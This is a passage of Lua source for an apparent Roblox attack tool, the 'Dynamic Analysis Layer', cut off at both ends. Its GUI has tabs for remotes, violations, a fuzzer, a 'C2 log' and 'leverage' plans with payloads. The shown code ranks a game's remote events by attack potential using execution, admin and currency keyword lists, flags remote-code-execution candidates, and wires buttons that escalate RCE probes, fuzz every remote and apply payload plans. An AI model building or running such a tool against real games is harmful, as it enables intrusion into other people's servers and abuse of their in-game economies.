        lbl.TextSize               = 6
        lbl.TextColor3             = color
        lbl.TextWrapped            = true
        lbl.TextXAlignment         = Enum.TextXAlignment.Left
        lbl.ZIndex                 = 53
        lbl.Parent                 = f

        return num, f
    end

    local remNum,  remBlock  = statBlock(6,   "REMOTES\nFOUND",     Color3.fromRGB( 90, 180, 255))
    local violNum, violBlock = statBlock(112, "TOTAL\nVIOLATIONS",  Color3.fromRGB(220, 175,  50))
    local critNum, critBlock = statBlock(218, "CRITICAL+\nFOUND",   Color3.fromRGB(228,  60,  80))
    local rceNum,  rceBlock  = statBlock(324, "SB-RCE\nCONFIRMED",  Color3.fromRGB(200,  40, 220))

    local function pulse(block)
        TweenService:Create(block, TweenInfo.new(0.08), { BackgroundTransparency = 0.40 }):Play()
        task.delay(0.08, function()
            TweenService:Create(block, TweenInfo.new(0.35), { BackgroundTransparency = 0.82 }):Play()
        end)
    end

    local function updateStats()
        local remCount = 0
        for _ in pairs(DAL.discovered) do remCount = remCount + 1 end

        local violCount, critCount, rceCount = 0, 0, 0
        for _, v in ipairs(DAL.violations) do
            violCount = violCount + 1
            if v.severity.score >= SEV.CRITICAL.score then critCount = critCount + 1 end
            if v.severity == SEV.RCE then rceCount = rceCount + 1 end
        end

        if remNum.Text  ~= tostring(remCount)  then remNum.Text  = tostring(remCount);  pulse(remBlock)  end
        if violNum.Text ~= tostring(violCount) then violNum.Text = tostring(violCount); pulse(violBlock) end
        if critNum.Text ~= tostring(critCount) then critNum.Text = tostring(critCount); pulse(critBlock) end
        if rceNum.Text  ~= tostring(rceCount)  then rceNum.Text  = tostring(rceCount);  pulse(rceBlock)  end
    end

    return updateStats
end

-- -- CRITICAL ALERT BANNER --------------------------------------------
-- Slides down over the header when a CRITICAL or SB-RCE violation
-- lands, then retracts after a few seconds. Makes the tool feel like
-- it's actively watching rather than a static report you have to
-- go check on yourself.
local function buildAlertBanner(root, PW)
    local banner = Instance.new("Frame")
    banner.Name                   = "AlertBanner"
    banner.Position               = UDim2.fromOffset(0, -28)
    banner.Size                   = UDim2.new(1, 0, 0, 26)
    banner.BackgroundColor3       = Color3.fromRGB(228, 60, 80)
    banner.BackgroundTransparency = 0.15
    banner.BorderSizePixel        = 0
    banner.ZIndex                 = 80
    banner.Visible                = false
    banner.Parent                 = root

    local lbl = Instance.new("TextLabel")
    lbl.Size                   = UDim2.new(1, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Font                   = Enum.Font.GothamBlack
    lbl.TextSize               = 10
    lbl.TextColor3             = Color3.fromRGB(255, 235, 240)
    lbl.Text                   = ""
    lbl.ZIndex                 = 81
    lbl.Parent                 = banner

    local hideToken = 0
    local function trigger(v)
        hideToken = hideToken + 1
        local myToken = hideToken
        local isRCE = (v.severity.label == "SB-RCE")
        banner.BackgroundColor3 = isRCE and Color3.fromRGB(200, 40, 220) or Color3.fromRGB(228, 60, 80)
        lbl.Text = string.format("[!]  %s  --  %s  --  %s",
            v.severity.label, v.vtype, v.remotePath)
        banner.Visible  = true
        banner.Position = UDim2.fromOffset(0, -28)
        TweenService:Create(banner, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            { Position = UDim2.fromOffset(0, 0) }):Play()
        task.delay(3.2, function()
            if myToken ~= hideToken then return end
            TweenService:Create(banner, TweenInfo.new(0.25), { Position = UDim2.fromOffset(0, -28) }):Play()
            task.delay(0.25, function()
                if myToken == hideToken then banner.Visible = false end
            end)
        end)
    end

    return trigger
end

-- -- TAB 5 -- LEVERAGE ------------------------------------------------
local function buildLeverageTab(levPage, PW, PH, switchTab)
    -- Header bar with PRE-SCAN and SCAN ALL buttons
    local levBar = mkFrame(levPage, 0, 0, PW, 26, Color3.new(0,0,0), 1, 52)

    local preScanBtn = mkBtn(levBar, 4, 4, 72, 18, "PRE-SCAN",
        Color3.fromRGB(200, 40, 220), Color3.fromRGB(200, 40, 220), 53)
    local scanAllBtn = mkBtn(levBar, 80, 4, 74, 18, "SCAN ALL",
        Color3.fromRGB(228, 60, 80), Color3.fromRGB(228, 60, 80), 53)
    local planCountLbl = mkLabel(levBar, PW - 80, 0, 74, 26,
        "0 plans", 7, COL.DIM, Enum.TextXAlignment.Right, 53)

    -- RCE proximity legend
    local legFrame = mkFrame(levPage, 0, 26, PW, 18, Color3.new(0,0,0), 1, 52)
    mkLabel(legFrame, 4, 0, 60, 18, "PROXIMITY:", 6, COL.DIM,
        Enum.TextXAlignment.Left, 53)
    local proxCols = {
        [1] = { label="DIRECT",     col=Color3.fromRGB(200, 40,220) },
        [2] = { label="ONE HOP",    col=Color3.fromRGB(228, 60, 80) },
        [3] = { label="STRUCTURAL", col=Color3.fromRGB(220,175, 50) },
    }
    local lx = 70
    for _, pd in ipairs(proxCols) do
        local pb = mkFrame(legFrame, lx, 3, 68, 12, pd.col, 0.65, 53)
        uiCorner(pb, 3)
        mkLabel(pb, 0, 0, 68, 12, pd.label, 6, pd.col,
            Enum.TextXAlignment.Center, 54)
        lx = lx + 72
    end

    -- Plan scroll
    local levScroll = mkScroll(levPage, 2, 44, PW - 4, PH - 46, 52)

    local function rebuildLeverage()
        for _, c in ipairs(levScroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end

        planCountLbl.Text = #LE.plans .. " plan" ..
            (#LE.plans == 1 and "" or "s")

        for i, plan in ipairs(LE.plans) do
            -- Card height: technique + path + rationale + steps preview + buttons
            local cardH = 106
            local card = mkFrame(levScroll, 0, 0, PW - 14, cardH, COL.ROW, 0.22, 53)
            card.LayoutOrder = i
            uiCorner(card, 5)

            -- Proximity stripe on left
            local proxCol = proxCols[plan.rceProximity] and
                proxCols[plan.rceProximity].col or COL.DIM
            local stripe = mkFrame(card, 0, 0, 4, cardH, proxCol, 0.10, 54)
            uiCorner(stripe, 2)

            -- Technique name
            mkLabel(card, 9, 4, PW - 90, 14,
                plan.technique, 9, COL.TEXT,
                Enum.TextXAlignment.Left, 54)

            -- Proximity badge
            local proxLabel = proxCols[plan.rceProximity] and
                proxCols[plan.rceProximity].label or "?"
            local proxBg = mkFrame(card, PW - 82, 4, 68, 12, proxCol, 0.65, 54)
            uiCorner(proxBg, 3)
            mkLabel(proxBg, 0, 0, 68, 12, proxLabel, 6, proxCol,
                Enum.TextXAlignment.Center, 55)

            -- Remote path
            mkLabel(card, 9, 20, PW - 20, 11,
                "-> " .. plan.remotePath, 7, COL.DIM,
                Enum.TextXAlignment.Left, 54)

            -- Rationale (truncated)
            mkLabel(card, 9, 33, PW - 20, 11,
                plan.rationale:sub(1, 88), 7,
                Color3.fromRGB(160, 175, 210),
                Enum.TextXAlignment.Left, 54)

            -- First step preview
            local step1 = plan.steps and plan.steps[1] or ""
            mkLabel(card, 9, 46, PW - 20, 11,
                step1:sub(1, 88), 7,
                Color3.fromRGB(130, 200, 140),
                Enum.TextXAlignment.Left, 54)

            -- Payload preview
            mkLabel(card, 9, 59, PW - 20, 11,
                "Payload: " .. tostring(plan.payload):sub(1, 70),
                7, Color3.fromRGB(200, 160, 80),
                Enum.TextXAlignment.Left, 54)

            -- Node type badge
            local ntBg = mkFrame(card, 9, 74, 80, 12,
                Color3.fromRGB(50, 60, 100), 0.50, 54)
            uiCorner(ntBg, 3)
            mkLabel(ntBg, 0, 0, 80, 12,
                plan.nodeType, 6, COL.DIM,
                Enum.TextXAlignment.Center, 55)

            -- APPLY TO NODE button
            local applyBtn = mkBtn(card, PW - 120, 72, 50, 16,
                plan.applied and "[OK] APPLIED" or "APPLY",
                plan.applied
                    and Color3.fromRGB(60, 120, 60)
                    or  Color3.fromRGB(200, 40, 220),
                plan.applied
                    and Color3.fromRGB(100, 220, 100)
                    or  Color3.fromRGB(200, 40, 220),
                54)

            -- VIEW STEPS button
            local stepsBtn = mkBtn(card, PW - 66, 72, 52, 16, "STEPS",
                Color3.fromRGB(90, 180, 255),
                Color3.fromRGB(90, 180, 255), 54)

            local captPlan = plan
            applyBtn.MouseButton1Click:Connect(function()
                if not captPlan.applied then
                    local ok, result = LE:applyToNode(captPlan)
                    if ok then
                        applyBtn.Text             = "[OK] APPLIED"
                        applyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
                        applyBtn.TextColor3       = Color3.fromRGB(100, 220, 100)
                    end
                end
            end)

            stepsBtn.MouseButton1Click:Connect(function()
                -- Show full steps in a temporary overlay card
                local overlay = mkFrame(levPage, 2, 44, PW - 4, PH - 46,
                    COL.BG, 0.04, 58)
                uiCorner(overlay, 5)
                uiStroke(overlay, proxCol, 0.30, 1)

                -- Title
                mkLabel(overlay, 8, 6, PW - 60, 16,
                    captPlan.technique, 10, COL.TEXT,
                    Enum.TextXAlignment.Left, 59)

                -- Close button
                local closeBtn = mkBtn(overlay, PW - 52, 5, 40, 16, "CLOSE",
                    Color3.fromRGB(228, 60, 80),
                    Color3.fromRGB(228, 60, 80), 59)
                closeBtn.MouseButton1Click:Connect(function()
                    overlay:Destroy()
                end)

                -- Steps list
                local sy = 26
                for si, step in ipairs(captPlan.steps) do
                    local stepLbl = Instance.new("TextLabel")
                    stepLbl.Position               = UDim2.fromOffset(8, sy)
                    stepLbl.Size                   = UDim2.fromOffset(PW - 20, 0)
                    stepLbl.BackgroundTransparency = 1
                    stepLbl.Text                   = step
                    stepLbl.TextSize               = 8
                    stepLbl.Font                   = Enum.Font.Gotham
                    stepLbl.TextColor3             = Color3.fromRGB(180, 210, 180)
                    stepLbl.TextXAlignment         = Enum.TextXAlignment.Left
                    stepLbl.TextYAlignment         = Enum.TextYAlignment.Top
                    stepLbl.TextWrapped            = true
                    stepLbl.AutomaticSize          = Enum.AutomaticSize.Y
                    stepLbl.BorderSizePixel        = 0
                    stepLbl.ZIndex                 = 59
                    stepLbl.Parent                 = overlay
                    sy = sy + 28
                end

                -- Payload
                mkLabel(overlay, 8, sy + 4, PW - 20, 14,
                    "Payload: " .. tostring(captPlan.payload):sub(1, 100),
                    7, Color3.fromRGB(200, 160, 80),
                    Enum.TextXAlignment.Left, 59)
            end)
        end

        levScroll.CanvasSize = UDim2.fromOffset(0, #LE.plans * 110)
    end

    -- Wire LE plan callback to rebuild
    local _prevOnPlan = LE.onPlan
    LE.onPlan = function(p)
        if _prevOnPlan then _prevOnPlan(p) end
        rebuildLeverage()
    end

    preScanBtn.MouseButton1Click:Connect(function()
        preScanBtn.Text = "..."
        task.spawn(function()
            local count, ranked = LE:scanAndResolveAll()
            preScanBtn.Text = "PRE-SCAN"
            rebuildLeverage()
        end)
    end)

    scanAllBtn.MouseButton1Click:Connect(function()
        scanAllBtn.Text = "RUNNING..."
        -- Pre-scan first, then full fuzz
        task.spawn(function()
            LE:scanAndResolveAll()
            DAL:fuzzAll(nil, function()
                scanAllBtn.Text = "SCAN ALL"
                rebuildLeverage()
            end)
        end)
    end)

    return rebuildLeverage
end

local function buildPanel(parentGui)

    -- Root -- fills the entire DAL tab page
    local root = Instance.new("Frame")
    root.Name                   = "DALPanel"
    root.Size                   = UDim2.new(1, 0, 1, 0)
    root.Position                = UDim2.new(0, 0, 0, 0)
    root.BackgroundColor3       = COL.BG
    root.BackgroundTransparency = 0.06
    root.BorderSizePixel        = 0
    root.ClipsDescendants       = true
    root.ZIndex                 = 5
    root.Parent                 = parentGui
    uiCorner(root, 8)
    local rootStroke = uiStroke(root, COL.BORDER, 0.35, 1)

    -- -- Header ---------------------------------------------------
    local hdr = mkFrame(root, 0, 0, PANEL_W, 32, COL.HDR, 0.08, 51)
    uiCorner(hdr, 8)
    mkLabel(hdr, 12, 0, PANEL_W - 120, 32,
        "[DAL]  DYNAMIC ANALYSIS LAYER", 10, COL.TEXT,
        Enum.TextXAlignment.Left, 52)

    -- Mode toggle button
    local modeColors = {
        [1] = { bg = Color3.fromRGB( 80,  60, 180), text = Color3.fromRGB(180, 160, 255) },
        [2] = { bg = Color3.fromRGB(180,  40, 200), text = Color3.fromRGB(255, 160, 255) },
    }
    local modeBtn = mkBtn(hdr, PANEL_W - 90, 7, 82, 18,
        "* MODE 1",
        modeColors[1].bg, modeColors[1].text, 52)
    modeBtn.MouseButton1Click:Connect(function()
        DAL.mode = DAL.mode == 1 and 2 or 1
        local mc = modeColors[DAL.mode]
        modeBtn.Text           = "* MODE " .. DAL.mode
        modeBtn.BackgroundColor3 = mc.bg
        modeBtn.TextColor3       = mc.text
        uiStroke(modeBtn, mc.bg, 0.55, 1)
        -- Tie the whole panel's border glow to the active mode --
        -- this is part of what makes it read as a live control
        -- center rather than a static tool.
        TweenService:Create(rootStroke, TweenInfo.new(0.30), { Color = mc.bg }):Play()
    end)

    -- -- Stats dashboard + critical alert banner --------------------
    -- Live counters and a flashing top banner. This is the piece that
    -- makes the panel feel like it's actively watching instead of
    -- just listing things.
    local updateStats  = buildStatsBar(root, PANEL_W)
    local triggerAlert = buildAlertBanner(root, PANEL_W)
    local STATS_H = 34

    -- -- Tab bar --------------------------------------------------
    local TAB_H  = 26
    local tabBar = mkFrame(root, 0, 32 + STATS_H, PANEL_W, TAB_H, Color3.fromRGB(12, 14, 24), 0.15, 51)
    local CONTENT_Y = 32 + STATS_H + TAB_H

    local tabDefs = {
        { label = "REMOTES",    accent = Color3.fromRGB( 90, 180, 255) },
        { label = "VIOLATIONS", accent = Color3.fromRGB(228,  60,  80) },
        { label = "FUZZER",     accent = Color3.fromRGB(220, 175,  50) },
        { label = "C2 LOG",     accent = Color3.fromRGB(160,  80, 255) },
        { label = "LEVERAGE",   accent = Color3.fromRGB(200,  40, 220) },
        { label = "PRE-SCAN",   accent = Color3.fromRGB( 40, 180, 120) },
    }
    local pages     = {}
    local tabBtns   = {}
    local activeTab = 1

    local tabX = 4
    for i, td in ipairs(tabDefs) do
        local tw2 = math.max(56, #td.label * 7 + 14)
        local tb  = Instance.new("TextButton")
        tb.Position               = UDim2.fromOffset(tabX, 3)
        tb.Size                   = UDim2.fromOffset(tw2, TAB_H - 6)
        tb.BackgroundColor3       = td.accent
        tb.BackgroundTransparency = 0.80
        tb.BorderSizePixel        = 0
        tb.Text                   = td.label
        tb.TextSize               = 8
        tb.Font                   = Enum.Font.GothamBold
        tb.TextColor3             = COL.DIM
        tb.AutoButtonColor        = false
        tb.ZIndex                 = 52
        tb.Parent                 = tabBar
        uiCorner(tb, 4)
        tabBtns[i] = tb
        tabX = tabX + tw2 + 3

        local pg = mkFrame(root, 0, CONTENT_Y, PANEL_W, PANEL_H - CONTENT_Y,
            Color3.new(0,0,0), 1, 51)
        pg.Visible = (i == 1)
        pages[i]   = pg
    end

    local function switchTab(idx)
        activeTab = idx
        for i, pg in ipairs(pages) do
            pg.Visible = (i == idx)
            tabBtns[i].TextColor3             = (i == idx) and COL.TEXT     or COL.DIM
            tabBtns[i].BackgroundTransparency = (i == idx) and 0.45          or 0.80
        end
    end
    for i, tb in ipairs(tabBtns) do
        local ci = i
        tb.MouseButton1Click:Connect(function() switchTab(ci) end)
    end
    switchTab(1)

    local PW = PANEL_W        -- shorthand
    local PH = PANEL_H - CONTENT_Y

    -- ============================================================
    --   TAB CONTENT -- built by dedicated functions (see above)
    --   Each tab gets its own 200-register budget instead of
    --   sharing one with buildPanel and the other three tabs.
    -- ============================================================
    local rebuildRemoteList = buildRemotesTab(pages[1], PW, PH, switchTab)
    local rebuildViolations = buildViolationsTab(pages[2], PW, PH)
    buildFuzzerTab(pages[3], PW, PH, rebuildViolations)
    buildC2LogTab(pages[4], PW, PH)
    DAL.buildLeverageTab(pages[5], PW, PH, switchTab)
    DAL.buildSpsTab(pages[6], PW, PH)

    -- -- Wire discovery -> remote list + live stats ------------------
    DAL.onDiscovery = function()
        rebuildRemoteList()
        updateStats()
    end

    -- -- Wire violations -> live stats + critical alert banner -------
    -- buildViolationsTab already chained itself onto DAL.onViolation
    -- (to call rebuildViolations). Chain onto THAT here so the stats
    -- bar and alert banner update on every single violation too.
    local _prevOnViolation = DAL.onViolation
    DAL.onViolation = function(v)
        if _prevOnViolation then _prevOnViolation(v) end
        updateStats()
        if v.severity.score >= SEV.CRITICAL.score then
            triggerAlert(v)
        end
    end

    updateStats()  -- initial paint, all zeros

    return root
end
-- ==================================================================
--   STATIC PRE-SCAN  (SPS)
--   Tier 0 of the attack pipeline -- runs BEFORE any fuzzing.
--
--   Purpose: find the TARGET before pulling the trigger.
--   Instead of blindly probing every remote, SPS reads everything
--   it can about each remote without touching it, scores it across
--   five independent risk axes, then returns a ranked priority list
--   that tells the fuzzer exactly where to aim first.
--
--   Five scoring axes:
--     1. NAME SEMANTICS    -- does the name suggest an execution sink?
--     2. ANCESTRY          -- where in the DataModel does it live?
--     3. ARG SHAPE         -- does the handler accept arbitrary strings?
--     4. IDENTITY CHAIN    -- does the path pass through a Bindable?
--     5. BROADCAST VECTOR  -- does the name imply fleet-wide reach?
-- ==================================================================

-- ----------------------------------------------------------------
--   SCORING DICTIONARIES
-- ----------------------------------------------------------------
local SPS_EXEC_KEYWORDS = {
    { kw="loadstring",  w=20 }, { kw="eval",       w=18 },
    { kw="execute",     w=16 }, { kw="exec",        w=16 },
    { kw="interpret",   w=16 }, { kw="compile",     w=14 },
    { kw="run",         w=12 }, { kw="dispatch",    w=10 },
    { kw="invoke",      w=10 }, { kw="perform",     w=8  },
    { kw="process",     w=8  }, { kw="handle",      w=6  },
    { kw="call",        w=6  }, { kw="trigger",     w=6  },
    { kw="command",     w=8  }, { kw="cmd",         w=8  },
    { kw="script",      w=10 }, { kw="code",        w=10 },
    { kw="require",     w=12 }, { kw="load",        w=10 },
    { kw="import",      w=8  }, { kw="inject",      w=10 },
    { kw="insert",      w=6  }, { kw="create",      w=4  },
    { kw="spawn",       w=8  }, { kw="instantiate", w=10 },
    { kw="admin",       w=8  }, { kw="auth",        w=6  },
    { kw="token",       w=6  }, { kw="key",         w=4  },
    { kw="secret",      w=8  }, { kw="permission",  w=4  },
    { kw="grant",       w=6  }, { kw="elevate",     w=10 },
    { kw="sudo",        w=12 }, { kw="root",        w=8  },
    { kw="system",      w=6  }, { kw="internal",    w=4  },
}

local SPS_ANCESTRY_SCORES = {
    ["ServerScriptService"] = 20,
    ["ServerStorage"]       = 18,
    ["ReplicatedStorage"]   = 8,
    ["ReplicatedFirst"]     = 6,
    ["Workspace"]           = 10,
    ["StarterGui"]          = 4,
    ["StarterPack"]         = 4,
    ["StarterPlayer"]       = 4,
    ["Players"]             = 12,
}

local SPS_BROADCAST_KEYWORDS = {
    { kw="broadcast",   w=16 }, { kw="fleet",      w=16 },
    { kw="global",      w=12 }, { kw="publish",    w=14 },
    { kw="message",     w=8  }, { kw="announce",   w=10 },
    { kw="notify",      w=8  }, { kw="alert",      w=6  },
    { kw="sync",        w=6  }, { kw="replicate",  w=8  },
    { kw="propagate",   w=10 }, { kw="distribute", w=10 },
    { kw="crossserver", w=18 }, { kw="cross_srv",  w=18 },
}

local SPS_ECONOMY_KEYWORDS = {
    { kw="buy",      w=8 }, { kw="purchase", w=8 },
    { kw="sell",     w=6 }, { kw="trade",    w=8 },
    { kw="transfer", w=8 }, { kw="redeem",   w=6 },
    { kw="claim",    w=6 }, { kw="collect",  w=4 },
    { kw="upgrade",  w=4 }, { kw="spend",    w=6 },
    { kw="withdraw", w=8 }, { kw="deposit",  w=8 },
    { kw="coin",     w=6 }, { kw="gold",     w=6 },
    { kw="cash",     w=6 }, { kw="currency", w=8 },
    { kw="points",   w=4 }, { kw="xp",       w=4 },
    { kw="level",    w=4 }, { kw="loot",     w=4 },
}

-- ----------------------------------------------------------------
--   SPS STATE
-- ----------------------------------------------------------------
local SPS = { results = {}, lastScan = 0 }

local function spsGetAncestry(inst)
    local score = 0; local ancestor = "Unknown"
    local p = inst.Parent; local depth = 0
    while p and p ~= game and depth < 8 do
        local sc = SPS_ANCESTRY_SCORES[p.Name]
        if sc and sc > score then score = sc; ancestor = p.Name end
        p = p.Parent; depth = depth + 1
    end
    return score, ancestor
end

local function spsKeywordScore(name, kwTable)
    local lower = name:lower(); local total = 0; local hits = {}
    for _, e in ipairs(kwTable) do
        if lower:find(e.kw, 1, true) then
            total = total + e.w; table.insert(hits, e.kw)
        end
    end
    return total, hits
end

local function spsArgShape(inst)
    local score = 0; local findings = {}
    local name = inst.Name:lower()
    local strKws = { "command","cmd","query","message","text","chat",
                     "input","data","payload","content","action","type",
                     "event","request","call" }
    for _, kw in ipairs(strKws) do
        if name:find(kw, 1, true) then
            score = score + 6
            table.insert(findings, "arg-shape:" .. kw); break
        end
    end
    local parent = inst.Parent
    if parent then
        local ok, ch = pcall(function() return parent:GetChildren() end)
        if ok then
            for _, sib in ipairs(ch) do
                if sib ~= inst and sib:IsA("LocalScript") and
                   sib.Name:lower():find(name:sub(1,4), 1, true) then
                    score = score + 8
                    table.insert(findings, "sibling-ls:" .. sib.Name); break
                end
            end
        end
    end
    return score, findings
end

local function spsIdentityChain(inst)
    local score = 0; local findings = {}
    local parent = inst.Parent
    if not parent then return 0, {} end
    local ok, siblings = pcall(function() return parent:GetChildren() end)
    if not ok then return 0, {} end
    for _, sib in ipairs(siblings) do
        if sib ~= inst and
           (sib:IsA("BindableEvent") or sib:IsA("BindableFunction")) then
            score = score + 10
            table.insert(findings, "bindable:" .. sib.Name)
        end
    end
    local handoffs = { "relay","forward","pass","proxy","bridge","route" }
    local nl = inst.Name:lower()
    for _, hw in ipairs(handoffs) do
        if nl:find(hw, 1, true) then
            score = score + 8
            table.insert(findings, "handoff:" .. hw); break
        end
    end
    return score, findings
end

-- ----------------------------------------------------------------
--   MAIN SCAN
-- ----------------------------------------------------------------
function DAL:staticPreScan(onProgress, onComplete)
    SPS.results = {}; SPS.lastScan = tick()
    local paths = {}
    for path in pairs(self.discovered) do table.insert(paths, path) end
    if #paths == 0 then if onComplete then onComplete({}) end; return end

    task.spawn(function()
        for i, path in ipairs(paths) do
            local rec = self.discovered[path]
            if rec and rec.inst then
                local inst = rec.inst; local findings = {}; local axes = {}

                local a1, h1 = spsKeywordScore(inst.Name, SPS_EXEC_KEYWORDS)
                axes.nameSemantic = math.min(a1, 30)
                for _, h in ipairs(h1) do
                    table.insert(findings, "EXEC-KW:" .. h)
                end

                local a2, anc = spsGetAncestry(inst)
                axes.ancestry = math.min(a2, 20)
                if a2 > 0 then
                    table.insert(findings, "ANCESTRY:" .. anc)
                end

                local a3, h3 = spsArgShape(inst)
                axes.argShape = math.min(a3, 20)
                for _, h in ipairs(h3) do
                    table.insert(findings, h)
                end

                local a3b, h3b = spsKeywordScore(inst.Name, SPS_ECONOMY_KEYWORDS)
                axes.economy = math.min(a3b, 10)
                for _, h in ipairs(h3b) do
                    table.insert(findings, "ECON:" .. h)
                end

                local a4, h4 = spsIdentityChain(inst)
                axes.identityChain = math.min(a4, 20)
                for _, h in ipairs(h4) do
                    table.insert(findings, h)
                end

                local a5, h5 = spsKeywordScore(inst.Name, SPS_BROADCAST_KEYWORDS)
                axes.broadcast = math.min(a5, 20)
                for _, h in ipairs(h5) do
                    table.insert(findings, "BC:" .. h)
                end

                local rfBonus = inst:IsA("RemoteFunction") and 5 or 0
                axes.rfBonus = rfBonus
                if rfBonus > 0 then
                    table.insert(findings, "TYPE:RemoteFunction")
                end

                local score = math.min(
                    axes.nameSemantic + axes.ancestry + axes.argShape +
                    axes.economy + axes.identityChain + axes.broadcast +
                    axes.rfBonus, 100)

                local priority =
                    score >= 60 and "CRITICAL" or
                    score >= 35 and "HIGH"     or
                    score >= 15 and "MEDIUM"   or "LOW"

                local recommended =
                    axes.nameSemantic >= 14 and "RCE_PROBE" or
                    score >= 35             and "FUZZ"       or
                    score >= 15             and "MONITOR"    or "SKIP"

                local spsRec = {
                    path         = path,
                    inst         = inst,
                    score        = score,
                    rank         = 0,
                    axes         = axes,
                    findings     = findings,
                    priority     = priority,
                    rceCandidate = (axes.nameSemantic >= 14 or score >= 70),
                    recommended  = recommended,
                }
                table.insert(SPS.results, spsRec)

                DALSink:push({
                    type     = "SPS",
                    sev      = priority,
                    path     = path,
                    evidence = string.format(
                        "Score:%d Rec:%s [N:%d A:%d Arg:%d ID:%d BC:%d]",
                        score, recommended, axes.nameSemantic, axes.ancestry,
                        axes.argShape, axes.identityChain, axes.broadcast),
                })

                if onProgress then
                    onProgress(i, #paths, path, score, recommended)
                end
            end
            task.wait(0)
        end

        table.sort(SPS.results, function(a, b) return a.score > b.score end)
        for i, r in ipairs(SPS.results) do r.rank = i end

        -- Auto-log violations for high-confidence findings
        for _, r in ipairs(SPS.results) do
            if r.score >= 35 and #r.findings > 0 then
                local sev = r.priority == "CRITICAL" and SEV.CRITICAL
                         or r.priority == "HIGH"     and SEV.HIGH
                         or SEV.MEDIUM
                local vt = r.rceCandidate and VTYPE.RCE_BOUNDARY
                        or r.axes.identityChain > 0 and VTYPE.IDENTITY_LOSS
                        or r.axes.broadcast > 0     and VTYPE.BROADCAST_POISON
                        or VTYPE.LOGIC_BYPASS
                self:logViolation(vt, sev, r.path,
                    "static-pre-scan",
                    string.format("[SPS #%d | Score %d | %s] %s",
                        r.rank, r.score, r.recommended,
                        table.concat(r.findings, " | "):sub(1, 180)),
                    "SPS-" .. r.rank)
            end
        end

        if onComplete then onComplete(SPS.results) end
    end)
end

function DAL:getSpsResults() return SPS.results end

function DAL:escalateRceCandidates(onProgress, onComplete)
    if self.mode ~= 2 then
        if onComplete then onComplete(0) end; return
    end
    local candidates = {}
    for _, r in ipairs(SPS.results) do
        if r.recommended == "RCE_PROBE" then
            table.insert(candidates, r)
        end
    end
    if #candidates == 0 then
        if onComplete then onComplete(0) end; return
    end
    task.spawn(function()
        for i, r in ipairs(candidates) do
            if onProgress then onProgress(i, #candidates, r.path) end
            self:probeRCEBoundary(r.path, nil)
            task.wait(self.FUZZ_RATE * 2)
        end
        if onComplete then onComplete(#candidates) end
    end)
end

-- ----------------------------------------------------------------
--   SPS TAB BUILDER
-- ----------------------------------------------------------------
local function buildSpsTab(spsPage, PW, PH)
    local bar = Instance.new("Frame")
    bar.Position               = UDim2.fromOffset(0, 0)
    bar.Size                   = UDim2.fromOffset(PW, 28)
    bar.BackgroundTransparency = 1
    bar.BorderSizePixel        = 0
    bar.ZIndex                 = 52
    bar.Parent                 = spsPage

    local scanBtn  = mkBtn(bar,  4,  4, 70, 20, "PRE-SCAN",
        Color3.fromRGB(90,180,255), Color3.fromRGB(90,180,255), 53)
    local escalBtn = mkBtn(bar, 78,  4, 80, 20, "ESCALATE RCE",
        Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 53)
    local statusLbl = mkLabel(bar, 162, 0, PW - 170, 28,
        "Run PRE-SCAN to rank remotes by attack potential.",
        7, COL.DIM, Enum.TextXAlignment.Left, 53)

    local scroll = mkScroll(spsPage, 2, 30, PW - 4, PH - 32, 52)

    local function rebuildSps()
        for _, c in ipairs(scroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        local results = DAL:getSpsResults()
        if #results == 0 then
            local er = mkFrame(scroll, 0, 0, PW - 14, 24,
                Color3.new(0,0,0), 1, 53)
            er.LayoutOrder = 1
            mkLabel(er, 8, 0, PW - 20, 24,
                "No results. Press PRE-SCAN after crawling.",
                7, COL.DIM, Enum.TextXAlignment.Left, 54)
            scroll.CanvasSize = UDim2.fromOffset(0, 30)
            return
        end

        local ROW_H = 54
        for i, r in ipairs(results) do
            local pc =
                r.priority == "CRITICAL" and Color3.fromRGB(228, 60, 80) or
                r.priority == "HIGH"     and Color3.fromRGB(220,120, 50) or
                r.priority == "MEDIUM"   and Color3.fromRGB(220,175, 50) or
                                            Color3.fromRGB( 90,180,255)

            local row = mkFrame(scroll, 0, 0, PW - 14, ROW_H,
                COL.ROW, 0.30, 53)
            row.LayoutOrder = i
            uiCorner(row, 4)

            -- Rank
            local rkBg = mkFrame(row, 4, (ROW_H-18)/2, 24, 18,
                pc, 0.65, 54)
            uiCorner(rkBg, 3)
            mkLabel(rkBg, 0, 0, 24, 18, "#"..r.rank, 6, pc,
                Enum.TextXAlignment.Center, 55)

            -- Priority
            local priBg = mkFrame(row, 32, (ROW_H-13)/2, 52, 13,
                pc, 0.70, 54)
            uiCorner(priBg, 3)
            mkLabel(priBg, 0, 0, 52, 13, r.priority, 6, pc,
                Enum.TextXAlignment.Center, 55)

            -- RCE flag
            if r.rceCandidate then
                local rceBg = mkFrame(row, 88, (ROW_H-13)/2, 32, 13,
                    Color3.fromRGB(200,40,220), 0.65, 54)
                uiCorner(rceBg, 3)
                mkLabel(rceBg, 0, 0, 32, 13, "RCE?", 6,
                    Color3.fromRGB(200,40,220),
                    Enum.TextXAlignment.Center, 55)
            end

            -- Score bar
            local bw = math.max(1,
                math.floor((PW - 200) * (r.score / 100)))
            local sbar = mkFrame(row, 124, (ROW_H-5)/2, bw, 5,
                pc, 0.50, 54)
            uiCorner(sbar, 2)
            mkLabel(row, 124 + bw + 3, (ROW_H-13)/2, 26, 13,
                tostring(r.score), 7, pc,
                Enum.TextXAlignment.Left, 54)

            -- Path
            mkLabel(row, 32, 4, PW - 120, 13,
                r.path, 7, COL.TEXT,
                Enum.TextXAlignment.Left, 54)

            -- Top finding
            mkLabel(row, 32, ROW_H - 17, PW - 120, 12,
                (r.findings[1] or ""):sub(1, 75), 6,
                Color3.fromRGB(155,165,200),
                Enum.TextXAlignment.Left, 54)

            -- Recommendation badge
            local recCols = {
                RCE_PROBE=Color3.fromRGB(200,40,220),
                FUZZ=Color3.fromRGB(220,175,50),
                MONITOR=Color3.fromRGB(90,180,255),
                SKIP=Color3.fromRGB(60,70,100),
            }
            local rc = recCols[r.recommended] or COL.DIM
            local rbg = mkFrame(row, PW - 76, (ROW_H-15)/2, 68, 15,
                rc, 0.68, 54)
            uiCorner(rbg, 4)
            mkLabel(rbg, 0, 0, 68, 15, r.recommended, 6, rc,
